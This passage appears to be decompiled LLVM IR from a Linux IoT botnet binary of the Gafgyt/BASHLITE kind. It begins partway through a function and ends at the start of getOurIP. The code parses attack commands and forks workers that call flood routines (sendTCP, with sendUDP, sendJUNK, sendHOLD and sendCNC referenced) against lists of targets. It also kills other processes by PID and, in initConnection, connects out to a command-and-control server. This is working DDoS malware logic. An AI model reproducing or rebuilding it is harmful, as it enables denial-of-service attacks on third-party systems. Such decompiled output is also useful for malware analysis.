  %tmp241 = icmp slt i32 %v2_8050f45, 1
  %tmp242 = icmp eq i1 %tmp241, false
  br i1 %tmp242, label %dec_label_pc_8050f53, label %dec_label_pc_8051252

dec_label_pc_8050f53:                             ; preds = %dec_label_pc_8050f3a, %dec_label_pc_8050f34
  %v1_8050f56 = add i32 %tmp217, 4
  %v1_8050f59 = inttoptr i32 %v1_8050f56 to i32*
  %v2_8050f59 = load i32, i32* %v1_8050f59, align 4
  store i1 %v5_8050ece, i1* %cf.global-to-local, align 1
  %v2_8050f64 = load i32, i32* %v1_8050ed1, align 4
  %v2_8050f69 = call i32 @atol(i32 %v2_8050f64)
  store i1 %v5_8050eb5, i1* %cf.global-to-local, align 1
  %v2_8050f77 = load i32, i32* %v1_8050eb8, align 4
  %v2_8050f7c = call i32 @atol(i32 %v2_8050f77)
  store i1 %v2_8050ee7, i1* %cf.global-to-local, align 1
  %v2_8050f8a = load i32, i32* %v1_8050eea, align 4
  %v2_8050f8f = call i32 @atol(i32 %v2_8050f8a)
  %v1_8050f9a = add i32 %tmp217, 20
  %v1_8050f9d = inttoptr i32 %v1_8050f9a to i32*
  %v2_8050f9d = load i32, i32* %v1_8050f9d, align 4
  store i1 %v8_8050f34, i1* %cf.global-to-local, align 1
  br i1 %v1_8050f38, label %dec_label_pc_8050fca, label %dec_label_pc_8050fa8

dec_label_pc_8050fa8:                             ; preds = %dec_label_pc_8050f53
  %v1_8050fab = add i32 %tmp217, 28
  %v5_8050fab = icmp ugt i32* %arg2, inttoptr (i32 -29 to i32*)
  store i1 %v5_8050fab, i1* %cf.global-to-local, align 1
  %v1_8050fae = inttoptr i32 %v1_8050fab to i32*
  %v2_8050fae = load i32, i32* %v1_8050fae, align 4
  %v2_8050fb3 = call i32 @atol(i32 %v2_8050fae)
  br label %dec_label_pc_8050fca

dec_label_pc_8050fca:                             ; preds = %dec_label_pc_8050f53, %dec_label_pc_8050fa8
  %storemerge3 = phi i32 [ %v2_8050fb3, %dec_label_pc_8050fa8 ], [ 10, %dec_label_pc_8050f53 ]
  store i32 %storemerge3, i32* @esi, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  br i1 %v7_8050f1a, label %dec_label_pc_8050fd9, label %dec_label_pc_8050ffb

dec_label_pc_8050fd9:                             ; preds = %dec_label_pc_8050fca
  %v1_8050fdc = add i32 %tmp217, 24
  %v5_8050fdc = icmp ugt i32* %arg2, inttoptr (i32 -25 to i32*)
  store i1 %v5_8050fdc, i1* %cf.global-to-local, align 1
  %v1_8050fdf = inttoptr i32 %v1_8050fdc to i32*
  %v2_8050fdf = load i32, i32* %v1_8050fdf, align 4
  %v2_8050fe4 = call i32 @atol(i32 %v2_8050fdf)
  br label %dec_label_pc_8050ffb

dec_label_pc_8050ffb:                             ; preds = %dec_label_pc_8050fca, %dec_label_pc_8050fd9
  %storemerge2 = phi i32 [ %v2_8050fe4, %dec_label_pc_8050fd9 ], [ 0, %dec_label_pc_8050fca ]
  store i32 %storemerge2, i32* @edi, align 4
  %v4_805100f = inttoptr i32 %v2_8050f59 to i8*
  %v4_8051012 = call i32 @__GI_strchr(i8* %v4_805100f, i32 44)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8051017 = icmp eq i32 %v4_8051012, 0
  br i1 %v1_8051017, label %dec_label_pc_80510a0, label %dec_label_pc_805101f

dec_label_pc_805101f:                             ; preds = %dec_label_pc_8050ffb
  store i32 %v2_8050f59, i32* @eax, align 4
  %v3_805102d = call i32 @__GI_strtok(i32 %v2_8050f59, i32 ptrtoint (i32* @global_var_805d311.859 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_805109827 = icmp eq i32 %v3_805102d, 0
  %v1_805109c34 = icmp eq i1 %v4_805109827, false
  br i1 %v1_805109c34, label %dec_label_pc_8051037, label %dec_label_pc_80510ee

dec_label_pc_8051037:                             ; preds = %dec_label_pc_805101f, %dec_label_pc_8051081
  %storemerge1935 = phi i32 [ %v3_8051090, %dec_label_pc_8051081 ], [ %v3_805102d, %dec_label_pc_805101f ]
  %v0_8051037 = call i32 @listFork()
  store i32 %v0_8051037, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_805103c = icmp eq i32 %v0_8051037, 0
  %v1_805103e = icmp eq i1 %v1_805103c, false
  br i1 %v1_805103e, label %dec_label_pc_8051081, label %dec_label_pc_8051040

dec_label_pc_8051040:                             ; preds = %dec_label_pc_8051037
  %v8_8051070 = inttoptr i32 %v2_8050f9d to i8*
  %v9_8051070 = call i32 @sendTCP(i32 %storemerge1935, i32 %v2_8050f69, i32 %v2_8050f7c, i32 %v2_8050f8f, i8* %v8_8051070, i32 %storemerge2, i32 %storemerge3)
  %v2_805107c = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_8051081:                             ; preds = %dec_label_pc_8051037
  %v3_8051090 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_805d311.859 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_8051098 = icmp eq i32 %v3_8051090, 0
  %v1_805109c = icmp eq i1 %v4_8051098, false
  br i1 %v1_805109c, label %dec_label_pc_8051037, label %dec_label_pc_80510ee

dec_label_pc_80510a0:                             ; preds = %dec_label_pc_8050ffb
  %v0_80510a0 = call i32 @listFork()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_80510a5 = icmp eq i32 %v0_80510a0, 0
  %v1_80510a7 = icmp eq i1 %v1_80510a5, false
  br i1 %v1_80510a7, label %dec_label_pc_8051252, label %dec_label_pc_80510ad

dec_label_pc_80510ad:                             ; preds = %dec_label_pc_80510a0
  %v8_80510dd = inttoptr i32 %v2_8050f9d to i8*
  %v9_80510dd = call i32 @sendTCP(i32 %v2_8050f59, i32 %v2_8050f69, i32 %v2_8050f7c, i32 %v2_8050f8f, i8* %v8_80510dd, i32 %storemerge2, i32 %storemerge3)
  %v2_80510e9 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_80510ee:                             ; preds = %dec_label_pc_8051081, %dec_label_pc_805101f, %dec_label_pc_8050e5d
  %v2_80510f1 = load i32, i32* %arg2, align 4
  %v4_805110e = inttoptr i32 %v2_80510f1 to i8*
  %v7_8051120 = call i32 @_strncmp(i8* %v4_805110e, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805d3e7.889, i32 0, i32 0), i32 5)
  %v8_8051120 = urem i32 %v7_8051120, 2
  %v9_8051120 = icmp eq i32 %v8_8051120, 0
  %v0_8051122 = load i1, i1* %cf.global-to-local, align 1
  %v2_8051122 = or i1 %v0_8051122, %v9_8051120
  %v3_8051122 = zext i1 %v2_8051122 to i32
  %v4_8051122 = load i32, i32* @edx, align 4
  %v5_8051122 = and i32 %v4_8051122, -256
  %v6_8051122 = or i32 %v3_8051122, %v5_8051122
  %v7_8051122 = xor i32 %v6_8051122, 1
  store i32 %v7_8051122, i32* %edx.global-to-local, align 4
  %v1_805112a = trunc i32 %v7_8051122 to i8
  %v3_805112a = zext i1 %v0_8051122 to i8
  %v15_805112a = icmp eq i8 %v1_805112a, %v3_805112a
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8051133 = icmp eq i1 %v15_805112a, false
  br i1 %v1_8051133, label %dec_label_pc_80511ff, label %dec_label_pc_80511a2

dec_label_pc_8051149:                             ; preds = %dec_label_pc_80511df, %dec_label_pc_80511a2
  %v2_805114c = mul i32 %storemerge, 4
  %v9_805114c = and i32 %storemerge, 1073741824
  %v10_805114c = icmp ne i32 %v9_805114c, 0
  store i32 %v2_805114c, i32* %edx.global-to-local, align 4
  %v0_8051151 = load i32, i32* @global_var_8065774.25, align 4
  %v2_8051156 = add i32 %v0_8051151, %v2_805114c
  %v1_8051159 = inttoptr i32 %v2_8051156 to i32*
  %v2_8051159 = load i32, i32* %v1_8051159, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_805115b = icmp eq i32 %v2_8051159, 0
  br i1 %v1_805115b, label %dec_label_pc_805119f, label %dec_label_pc_805115f

dec_label_pc_805115f:                             ; preds = %dec_label_pc_8051149
  store i1 %v10_805114c, i1* %cf.global-to-local, align 1
  store i32 %v2_805114c, i32* %edx.global-to-local, align 4
  %v2_805116f = load i32, i32* %v1_8051159, align 4
  store i32 %v2_805116f, i32* @ebx, align 4
  %v0_8051171 = call i32 @__libc_getpid()
  %v0_8051176 = load i32, i32* @ebx, align 4
  %v7_8051176 = icmp ult i32 %v0_8051176, %v0_8051171
  store i1 %v7_8051176, i1* %cf.global-to-local, align 1
  %v12_8051176 = icmp eq i32 %v0_8051176, %v0_8051171
  br i1 %v12_8051176, label %dec_label_pc_805119f, label %dec_label_pc_805117a

dec_label_pc_805117a:                             ; preds = %dec_label_pc_805115f
  store i1 %v10_805114c, i1* %cf.global-to-local, align 1
  store i32 %v2_805114c, i32* %edx.global-to-local, align 4
  %v0_8051182 = load i32, i32* @global_var_8065774.25, align 4
  %v2_8051187 = add i32 %v0_8051182, %v2_805114c
  %v1_805118a = inttoptr i32 %v2_8051187 to i32*
  %v2_805118a = load i32, i32* %v1_805118a, align 4
  %v3_8051197 = call i32 @kill(i32 %v2_805118a, i32 9)
  %v4_805119c = add i32 %stack_var_-28.1, 1
  br label %dec_label_pc_805119f

dec_label_pc_805119f:                             ; preds = %dec_label_pc_805115f, %dec_label_pc_8051149, %dec_label_pc_805117a
  %stack_var_-28.0 = phi i32 [ %stack_var_-28.1, %dec_label_pc_8051149 ], [ %stack_var_-28.1, %dec_label_pc_805115f ], [ %v4_805119c, %dec_label_pc_805117a ]
  %v4_805119f = add i32 %storemerge, 1
  br label %dec_label_pc_80511a2

dec_label_pc_80511a2:                             ; preds = %dec_label_pc_80510ee, %dec_label_pc_805119f
  %stack_var_-28.1 = phi i32 [ %stack_var_-28.0, %dec_label_pc_805119f ], [ 0, %dec_label_pc_80510ee ]
  %storemerge = phi i32 [ %v4_805119f, %dec_label_pc_805119f ], [ 0, %dec_label_pc_80510ee ]
  %v0_80511b6 = load i32, i32* @global_var_805f4e8.23, align 8
  %v0_80511bb = load i32, i32* @global_var_805f4ec.24, align 4
  store i32 %v0_80511bb, i32* %edx.global-to-local, align 4
  %v10_80511d3 = icmp ne i32 %v0_80511bb, 0
  store i1 %v10_80511d3, i1* %cf.global-to-local, align 1
  br i1 %v10_80511d3, label %dec_label_pc_8051149, label %dec_label_pc_80511df

dec_label_pc_80511df:                             ; preds = %dec_label_pc_80511a2
  %v10_80511f3 = icmp ult i32 %storemerge, %v0_80511b6
  store i1 %v10_80511f3, i1* %cf.global-to-local, align 1
  br i1 %v10_80511f3, label %dec_label_pc_8051149, label %dec_label_pc_80511ff

dec_label_pc_80511ff:                             ; preds = %dec_label_pc_80511df, %dec_label_pc_80510ee
  %v2_8051202 = load i32, i32* %arg2, align 4
  store i1 false, i1* @df, align 1
  %v4_805121f = inttoptr i32 %v2_8051202 to i8*
  store i32 ptrtoint ([12 x i8]* @global_var_805d3ec.890 to i32), i32* @edi, align 4
  %v7_8051231 = call i32 @_strncmp(i8* %v4_805121f, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_805d3ec.890, i32 0, i32 0), i32 12)
  %v8_8051231 = urem i32 %v7_8051231, 2
  %v9_8051231 = icmp eq i32 %v8_8051231, 0
  %v0_8051233 = load i1, i1* %cf.global-to-local, align 1
  %v2_8051233 = or i1 %v0_8051233, %v9_8051231
  %v3_8051233 = zext i1 %v2_8051233 to i32
  %v4_8051233 = load i32, i32* %edx.global-to-local, align 4
  %v5_8051233 = and i32 %v4_8051233, -256
  %v6_8051233 = or i32 %v3_8051233, %v5_8051233
  %v7_8051233 = xor i32 %v6_8051233, 1
  store i32 %v7_8051233, i32* %edx.global-to-local, align 4
  %v1_805123b = trunc i32 %v7_8051233 to i8
  %v3_805123b = zext i1 %v0_8051233 to i8
  %v4_805123b = sub nsw i8 %v1_805123b, %v3_805123b
  %v15_805123b = icmp eq i8 %v4_805123b, 0
  %v2_805123f = sext i8 %v4_805123b to i32
  store i32 %v2_805123f, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8051244 = icmp eq i1 %v15_805123b, false
  br i1 %v1_8051244, label %dec_label_pc_8051252, label %dec_label_pc_8051246

dec_label_pc_8051246:                             ; preds = %dec_label_pc_80511ff
  %v2_805124d = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_8051252

dec_label_pc_8051252:                             ; preds = %dec_label_pc_8050f3a, %dec_label_pc_8050d65, %dec_label_pc_8050b84, %dec_label_pc_8050a12, %dec_label_pc_8050648, %dec_label_pc_8050422, %dec_label_pc_8050293, %dec_label_pc_8050ea8, %dec_label_pc_8050d43, %dec_label_pc_8050b62, %dec_label_pc_80509f0, %dec_label_pc_8050825, %dec_label_pc_80505a0, %dec_label_pc_8050400, %dec_label_pc_8050271, %dec_label_pc_8050b6c, %dec_label_pc_8050ae5, %dec_label_pc_80509fa, %dec_label_pc_805091b, %dec_label_pc_805078d, %dec_label_pc_8050629, %dec_label_pc_805060e, %dec_label_pc_80505f5, %dec_label_pc_80505dc, %dec_label_pc_80505c3, %dec_label_pc_80505aa, %dec_label_pc_805051a, %dec_label_pc_805040a, %dec_label_pc_805037a, %dec_label_pc_805027b, %dec_label_pc_80501ac, %dec_label_pc_8050116, %dec_label_pc_805008b, %dec_label_pc_80511ff, %dec_label_pc_80510a0, %dec_label_pc_8050f1c, %dec_label_pc_8050efd, %dec_label_pc_8050ee4, %dec_label_pc_8050ecb, %dec_label_pc_8050eb2, %dec_label_pc_8050e2b, %dec_label_pc_8050d4d, %dec_label_pc_8050c94, %dec_label_pc_8050137, %dec_label_pc_8050027, %dec_label_pc_804feb9, %dec_label_pc_804fe58, %dec_label_pc_8051246
  %v0_805125c = phi i32 [ %v2_8050f45, %dec_label_pc_8050f3a ], [ %v2_8050d70, %dec_label_pc_8050d65 ], [ %v2_8050b8f, %dec_label_pc_8050b84 ], [ %v2_8050a1d, %dec_label_pc_8050a12 ], [ %v2_8050653, %dec_label_pc_8050648 ], [ %v2_805042d, %dec_label_pc_8050422 ], [ %v2_805029e, %dec_label_pc_8050293 ], [ %v2_8050e9d, %dec_label_pc_8050ea8 ], [ %v2_8050d38, %dec_label_pc_8050d43 ], [ %v2_8050b57, %dec_label_pc_8050b62 ], [ %v2_80509e5, %dec_label_pc_80509f0 ], [ %v2_805081a, %dec_label_pc_8050825 ], [ %v2_8050595, %dec_label_pc_80505a0 ], [ %v2_80503f5, %dec_label_pc_8050400 ], [ %v2_8050266, %dec_label_pc_8050271 ], [ %v2_8050b77, %dec_label_pc_8050b6c ], [ %v0_8050ae5, %dec_label_pc_8050ae5 ], [ %v2_8050a05, %dec_label_pc_80509fa ], [ %v0_805091b, %dec_label_pc_805091b ], [ %v0_805078d, %dec_label_pc_805078d ], [ %v2_8050634, %dec_label_pc_8050629 ], [ %v2_8050619, %dec_label_pc_805060e ], [ %v2_8050600, %dec_label_pc_80505f5 ], [ %v2_80505e7, %dec_label_pc_80505dc ], [ %v2_80505ce, %dec_label_pc_80505c3 ], [ %v2_80505b5, %dec_label_pc_80505aa ], [ %v0_805051a, %dec_label_pc_805051a ], [ %v2_8050415, %dec_label_pc_805040a ], [ %v0_805037a, %dec_label_pc_805037a ], [ %v2_8050286, %dec_label_pc_805027b ], [ %v2_80501a5, %dec_label_pc_80501ac ], [ %v0_8050116, %dec_label_pc_8050116 ], [ 0, %dec_label_pc_805008b ], [ %v2_805123f, %dec_label_pc_80511ff ], [ %v0_80510a0, %dec_label_pc_80510a0 ], [ %v2_8050f27, %dec_label_pc_8050f1c ], [ %v2_8050f08, %dec_label_pc_8050efd ], [ %v2_8050eef, %dec_label_pc_8050ee4 ], [ %v2_8050ed6, %dec_label_pc_8050ecb ], [ %v2_8050ebd, %dec_label_pc_8050eb2 ], [ %v0_8050e2b, %dec_label_pc_8050e2b ], [ %v2_8050d58, %dec_label_pc_8050d4d ], [ %v0_8050c94, %dec_label_pc_8050c94 ], [ %v1_8050123, %dec_label_pc_8050137 ], [ %v3_8050037, %dec_label_pc_8050027 ], [ %v3_804fedb, %dec_label_pc_804feb9 ], [ %v3_804fe68, %dec_label_pc_804fe58 ], [ %v2_805124d, %dec_label_pc_8051246 ]
  %v0_8051252 = load i32, i32* @esp, align 4
  %v5_8051252 = icmp ugt i32 %v0_8051252, -461
  store i1 %v5_8051252, i1* %cf.global-to-local, align 1
  %v2_8051258 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8051258, i32* @ebx, align 4
  store i32 %v0_804fe09, i32* @esi, align 4
  store i32 %v0_804fe08, i32* @edi, align 4
  ret i32 %v0_805125c

; uselistorder directives
  uselistorder i1 %v0_8051233, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 3, 2 }
  uselistorder i32 %stack_var_-28.1, { 0, 2, 1 }
  uselistorder i32 %v2_805114c, { 4, 2, 1, 3, 0 }
  uselistorder i1 %v0_8051122, { 1, 0 }
  uselistorder i32 %v3_8051090, { 1, 0 }
  uselistorder i32 %storemerge2, { 1, 0, 2 }
  uselistorder i32 %storemerge3, { 1, 0, 2 }
  uselistorder i32 %v2_8050f9d, { 1, 0 }
  uselistorder i32 %v2_8050f8f, { 1, 0 }
  uselistorder i32 %v2_8050f7c, { 1, 0 }
  uselistorder i32 %v2_8050f69, { 1, 0 }
  uselistorder i32 %v2_8050f59, { 2, 1, 0, 3 }
  uselistorder i32 %v1_8050f0d, { 1, 0 }
  uselistorder i32 %v2_8050f08, { 1, 0, 4, 2, 3 }
  uselistorder i32 %v2_8050eef, { 1, 0, 2 }
  uselistorder i32 %v2_8050ed6, { 1, 0, 2 }
  uselistorder i32 %v2_8050ebd, { 1, 0, 2 }
  uselistorder i1 %v0_8050e91, { 1, 0 }
  uselistorder i32 %v3_8050e1b, { 1, 0 }
  uselistorder i32 %v2_8050da7, { 1, 0 }
  uselistorder i32 %v2_8050d94, { 1, 0 }
  uselistorder i32 %v2_8050d84, { 2, 1, 0, 3 }
  uselistorder i1 %v0_8050d2c, { 1, 0 }
  uselistorder i32 %v3_8050c80, { 1, 0 }
  uselistorder i32 %v2_8050bc6, { 3, 4, 5, 0, 1, 2 }
  uselistorder i32 %v2_8050bb3, { 3, 4, 5, 0, 1, 2 }
  uselistorder i32 %v2_8050ba3, { 2, 3, 4, 1, 0, 5 }
  uselistorder i1 %v0_8050b4b, { 1, 0 }
  uselistorder i32 %v3_8050ad5, { 1, 0 }
  uselistorder i32 %v2_8050a54, { 1, 0 }
  uselistorder i32 %v2_8050a41, { 1, 0 }
  uselistorder i32 %v2_8050a31, { 2, 1, 0, 3 }
  uselistorder i1 %v0_80509d9, { 1, 0 }
  uselistorder i32 %v2_8050961, { 1, 0 }
  uselistorder i32 %v2_80508b1, { 1, 0 }
  uselistorder i32* %v1_8050835, { 2, 0, 1, 3 }
  uselistorder i1 %v5_8050832, { 2, 0, 1, 3 }
  uselistorder i1 %v0_805080e, { 1, 0 }
  uselistorder i32 %v7_805080c, { 1, 0 }
  uselistorder i32 %v3_805077d, { 1, 0 }
  uselistorder i32 %storemerge9, { 1, 0, 2 }
  uselistorder i32 %v2_80506b6, { 1, 0 }
  uselistorder i32 %v2_80506a3, { 1, 0 }
  uselistorder i32 %v2_8050690, { 1, 0 }
  uselistorder i32 %v2_805067a, { 1, 0 }
  uselistorder i32 %v2_8050667, { 2, 1, 0, 3 }
  uselistorder i32 %v1_8050639, { 1, 0 }
  uselistorder i32 %v2_8050634, { 1, 0, 4, 2, 3 }
  uselistorder i32 %v1_805061e, { 1, 0 }
  uselistorder i32 %v2_8050619, { 1, 0, 4, 2, 3 }
  uselistorder i32 %v2_8050600, { 1, 0, 2 }
  uselistorder i32 %v2_80505e7, { 1, 0, 2 }
  uselistorder i32 %v2_80505ce, { 1, 0, 2 }
  uselistorder i32 %v2_80505b5, { 1, 0, 2 }
  uselistorder i1 %v0_8050589, { 1, 0 }
  uselistorder i32 %v3_8050504, { 1, 0 }
  uselistorder i32 %v2_805046a, { 1, 0 }
  uselistorder i32 %v2_8050454, { 1, 0 }
  uselistorder i32 %v2_8050441, { 2, 1, 0, 3 }
  uselistorder i1 %v0_80503e9, { 1, 0 }
  uselistorder i32 %v3_8050364, { 1, 0 }
  uselistorder i32 %v2_80502db, { 1, 0 }
  uselistorder i32 %v2_80502c5, { 1, 0 }
  uselistorder i32 %v2_80502b2, { 2, 1, 0, 3 }
  uselistorder i1 %v0_805025a, { 1, 0 }
  uselistorder i1 %v0_80501ed, { 1, 0 }
  uselistorder i1 %v0_8050199, { 1, 0 }
  uselistorder i1 %v0_8050103, { 1, 0 }
  uselistorder i1 %v0_8050078, { 1, 0 }
  uselistorder i1 %v0_805000a, { 1, 0 }
  uselistorder i1 %v0_804ff94, { 1, 0 }
  uselistorder i1 %v0_804ff19, { 1, 0 }
  uselistorder i1 %v0_804fea6, { 1, 0 }
  uselistorder i1 %v0_804fe45, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32 %tmp217, { 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %edx.global-to-local, { 15, 20, 19, 16, 17, 18, 21, 0, 1, 3, 2, 4, 5, 7, 6, 8, 9, 11, 10, 12, 13, 14 }
  uselistorder i1* %cf.global-to-local, { 123, 124, 131, 125, 130, 126, 127, 128, 129, 132, 185, 133, 135, 134, 186, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 171, 160, 162, 161, 122, 163, 164, 165, 166, 167, 168, 169, 170, 172, 179, 173, 175, 174, 180, 176, 177, 178, 3, 4, 5, 6, 7, 8, 181, 9, 11, 10, 182, 12, 13, 14, 15, 16, 17, 18, 19, 20, 36, 21, 22, 23, 24, 25, 31, 26, 27, 28, 29, 30, 0, 32, 33, 34, 35, 37, 64, 38, 40, 39, 1, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 65, 77, 66, 68, 67, 2, 69, 70, 71, 72, 73, 74, 75, 76, 78, 183, 79, 81, 80, 184, 82, 83, 84, 85, 86, 87, 88, 89, 90, 95, 91, 92, 93, 94, 96, 108, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 109, 111, 110, 112, 114, 113, 115, 116, 117, 118, 119, 120, 121 }
  uselistorder i32 (i32, i32, i32)* @sendSTD, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @sendCNC, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @sendUDP, { 1, 0 }
  uselistorder i32* inttoptr (i32 -25 to i32*), { 3, 2, 0, 1, 4, 5 }
  uselistorder i32 (i32, i32, i32)* @sendJUNK, { 1, 0, 3, 2 }
  uselistorder i32 (i32, i32, i32)* @sendHOLD, { 1, 0, 3, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_805d311.859 to i32), { 7, 8, 6, 9, 5, 10, 4, 11, 3, 12, 2, 13, 1, 14, 0, 15, 16, 17 }
  uselistorder i32* inttoptr (i32 -13 to i32*), { 2, 3, 4, 5, 0, 1, 6, 7, 8 }
  uselistorder [3 x i8]* @global_var_805d3a0.878, { 1, 0 }
  uselistorder i32* %arg2, { 8, 9, 7, 10, 11, 6, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 0, 1, 2, 3, 4, 5, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48 }
  uselistorder i32 %arg1, { 0, 24, 12, 11, 23, 10, 22, 9, 21, 8, 20, 7, 19, 1, 18, 6, 17, 5, 16, 4, 15, 2, 14, 3, 13 }
  uselistorder label %dec_label_pc_8051252, { 47, 33, 34, 0, 35, 36, 37, 38, 39, 7, 40, 1, 41, 8, 42, 2, 15, 9, 16, 3, 17, 10, 18, 11, 19, 4, 20, 21, 22, 23, 24, 25, 12, 26, 5, 27, 13, 28, 6, 29, 14, 30, 43, 31, 32, 44, 45, 46 }
  uselistorder label %dec_label_pc_80511a2, { 1, 0 }
  uselistorder label %dec_label_pc_805119f, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8051037, { 1, 0 }
  uselistorder label %dec_label_pc_8050ffb, { 1, 0 }
  uselistorder label %dec_label_pc_8050fca, { 1, 0 }
  uselistorder label %dec_label_pc_8050f34, { 1, 0 }
  uselistorder label %dec_label_pc_8050dde, { 1, 0 }
  uselistorder label %dec_label_pc_8050c04, { 1, 0 }
  uselistorder label %dec_label_pc_8050a8b, { 1, 0 }
  uselistorder label %dec_label_pc_805086f, { 1, 0 }
  uselistorder label %dec_label_pc_8050728, { 1, 0 }
  uselistorder label %dec_label_pc_80506e6, { 1, 0 }
  uselistorder label %dec_label_pc_80504b1, { 1, 0 }
  uselistorder label %dec_label_pc_805031e, { 1, 0 }
  uselistorder label %dec_label_pc_80500cc, { 1, 0 }
}

define i32 @initConnection() local_unnamed_addr {
entry:
  %stack_var_-4104 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805125d = load i32, i32* @ebp, align 4
  store i32 %v0_805125d, i32* %stack_var_-4, align 4
  %v4_805125d = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_805125d, i32* @ebp, align 4
  %v2_8051266 = ptrtoint i32* %stack_var_-4104 to i32
  %tmp11 = bitcast i32* %stack_var_-4104 to i8*
  %v5_8051282 = call i32 @__GI_memset(i8* %tmp11, i32 0, i32 4096)
  %v0_8051287 = load i8*, i8** @global_var_805f4e0.20, align 4
  %v2_805128c = icmp eq i8* %v0_8051287, null
  br i1 %v2_805128c, label %dec_label_pc_80512a7, label %dec_label_pc_8051290

dec_label_pc_8051290:                             ; preds = %entry
  %v1_8051287 = ptrtoint i8* %v0_8051287 to i32
  %v2_8051298 = call i32 @__libc_close(i32 %v1_8051287)
  store i8* null, i8** @global_var_805f4e0.20, align 32
  br label %dec_label_pc_80512a7

dec_label_pc_80512a7:                             ; preds = %entry, %dec_label_pc_8051290
  %v0_80512a7 = load i32, i32* @global_var_805f1b0.891, align 16
  %v1_80512ac = icmp eq i32 %v0_80512a7, 0
  %v1_80512ae = icmp eq i1 %v1_80512ac, false
  br i1 %v1_80512ae, label %dec_label_pc_80512bc, label %dec_label_pc_80512c7

dec_label_pc_80512bc:                             ; preds = %dec_label_pc_80512a7
  %v1_80512c1 = add i32 %v0_80512a7, 1
  br label %dec_label_pc_80512c7

dec_label_pc_80512c7:                             ; preds = %dec_label_pc_80512a7, %dec_label_pc_80512bc
  %storemerge = phi i32 [ %v1_80512c1, %dec_label_pc_80512bc ], [ 0, %dec_label_pc_80512a7 ]
  store i32 %storemerge, i32* @global_var_805f1b0.891, align 16
  %v1_80512cc = mul i32 %storemerge, 4
  %v2_80512cc = add i32 %v1_80512cc, ptrtoint ([15 x i8]** @global_var_805f040.893 to i32)
  %v3_80512cc = inttoptr i32 %v2_80512cc to i32*
  %v4_80512cc = load i32, i32* %v3_80512cc, align 4
  store i32 %v4_80512cc, i32* @eax, align 4
  %v4_80512e0 = call i32 @strcpy(i8* %tmp11, i32 %v4_80512cc)
  %v0_80512e5 = load i32, i32* @global_var_805f044.894, align 4
  %v4_80512fe = call i32 @__GI_strchr(i8* %tmp11, i32 58)
  %v1_8051303 = icmp eq i32 %v4_80512fe, 0
  br i1 %v1_8051303, label %dec_label_pc_8051342, label %dec_label_pc_8051307

dec_label_pc_8051307:                             ; preds = %dec_label_pc_80512c7
  %v4_8051318 = call i32 @__GI_strchr(i8* %tmp11, i32 58)
  %v1_805131d = add i32 %v4_8051318, 1
  %v2_8051321 = call i32 @atol(i32 %v1_805131d)
  %v4_805133a = call i32 @__GI_strchr(i8* %tmp11, i32 58)
  %v5_805133a = inttoptr i32 %v4_805133a to i8*
  store i8 0, i8* %v5_805133a, align 1
  br label %dec_label_pc_8051342

dec_label_pc_8051342:                             ; preds = %dec_label_pc_80512c7, %dec_label_pc_8051307
  %stack_var_-8.0 = phi i32 [ %v0_80512e5, %dec_label_pc_80512c7 ], [ %v2_8051321, %dec_label_pc_8051307 ]
  %v4_8051359 = call i32 @socket(i32 2, i32 1, i32 0)
  %v1_805135e = inttoptr i32 %v4_8051359 to i8*
  store i8* %v1_805135e, i8** @global_var_805f4e0.20, align 32
  %v5_8051385 = call i32 @connectTimeout(i32 %v4_8051359, i32 %v2_8051266, i32 %stack_var_-8.0, i32 30)
  %v1_805138a = icmp eq i32 %v5_8051385, 0
  %. = zext i1 %v1_805138a to i32
  %v2_80513aa = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80513aa, i32* @ebp, align 4
  ret i32 %.

; uselistorder directives
  uselistorder i8* %v0_8051287, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
  uselistorder i32 (i32)* @atol, { 49, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17 }
  uselistorder label %dec_label_pc_8051342, { 1, 0 }
  uselistorder label %dec_label_pc_80512c7, { 1, 0 }
  uselistorder label %dec_label_pc_80512a7, { 1, 0 }
}

define i32 @getOurIP() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
